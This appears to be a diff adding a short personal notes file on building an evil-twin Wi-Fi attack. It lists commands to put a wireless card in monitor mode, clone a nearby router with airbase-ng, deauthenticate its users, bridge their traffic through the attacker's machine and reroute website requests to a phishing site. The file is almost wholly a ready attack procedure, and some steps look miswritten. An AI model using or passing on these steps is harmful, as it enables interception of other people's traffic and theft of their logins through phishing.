@@ -1,0 +1,26 @@
+Change DNS server so that it redirects websites to your website
+
+Monitor Mode
+1. ifconfig wlan0 down
+2. iwconfig wlan0 mode monitor
+3. airmon-ng check wlan0	//kill processes
+4. airodump-ng wlan0		//shows nearby wifi
+5. airbase-ng -a router_bssid --essid "router_name" -c 6 wlan0
+   after this command you are the fake router, now you have to 
+   deauth all the user previousely connected to origional router
+   After that they will be connected to you.
+6. aireplay-ng -0 0 -a router_bssid wlan0
+7. apt-get install bridge-utils
+8. brctl addbr evil
+9. brctl addbr evil wlan0
+10. brctl addif evil at0
+    at0 is interface created by airebase, evil is the bridge name,
+    command 9 and 10 bridges wlan0 and at0 to evil
+11. ifconfig at0 0.0.0.0 up
+12. ifconfig evil up
+13. dhclient3 evil
+
+
+till now it will make you router so that all user's traffic will
+go to origional router through your machine, so you can reroute 
+user's request for a website to your on fishing website (note complete)
